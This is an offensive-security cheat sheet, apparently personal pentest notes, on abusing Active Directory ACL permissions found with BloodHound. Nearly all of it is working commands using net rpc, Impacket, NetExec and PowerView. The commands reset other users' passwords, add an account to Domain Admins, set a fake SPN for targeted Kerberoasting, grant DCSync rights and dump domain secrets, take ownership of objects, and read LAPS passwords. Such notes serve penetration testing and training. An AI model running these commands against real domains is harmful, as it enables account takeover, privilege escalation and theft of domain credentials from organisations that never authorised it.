# ACL Abuse

Found via [[BloodHound]] — each edge tells you the attack.

---

## GenericAll on User — Change Their Password

```bash
net rpc password "targetuser" 'NewPassword123!' -U 'domain/controlleduser%password' -S $DC
```

```bash
impacket-changepasswd domain.local/targetuser@$DC -newpass 'NewPassword123!'
```

---

## GenericAll on Group — Add Yourself

```bash
net rpc group addmem "Domain Admins" controlleduser -U 'domain/controlleduser%password' -S $DC
```

---

## GenericWrite on User — Targeted Kerberoasting

```bash
# Add a fake SPN
impacket-addspn -u 'domain/controlleduser' -p 'password' -t targetuser -s 'HTTP/fake' $DC

# Kerberoast the target
impacket-GetUserSPNs domain.local/controlleduser:REDACTED -dc-ip $DC -request

# Clean up the SPN
impacket-addspn -u 'domain/controlleduser' -p 'password' -t targetuser -s 'HTTP/fake' $DC -r
```

→ [[Kerberoasting]]

---

## ForceChangePassword

```bash
net rpc password "targetuser" 'NewPassword123!' -U 'domain/controlleduser%password' -S $DC
```

---

## WriteDACL — Grant Yourself DCSync

```bash
impacket-dacledit -action write -rights DCSync -principal controlleduser -target-dn "DC=domain,DC=local" domain.local/controlleduser:REDACTED

# Then DCSync
impacket-secretsdump domain.local/controlleduser:REDACTED
```

→ [[DCSync]]

---

## WriteOwner — Take Ownership Then WriteDACL

```bash
impacket-owneredit -action write -new-owner controlleduser -target targetobject domain.local/controlleduser:REDACTED

# Then add rights via dacledit (see WriteDACL above)
```

---

## ReadLAPSPassword

```bash
nxc ldap $DC -u user -p pass -M laps
```

---

## PowerView Equivalents (Windows)

```powershell
# GenericAll on user — reset password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)

# Add to group
Add-DomainGroupMember -Identity "Domain Admins" -Members controlleduser

# WriteDACL — grant DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity controlleduser -Rights DCSync
```
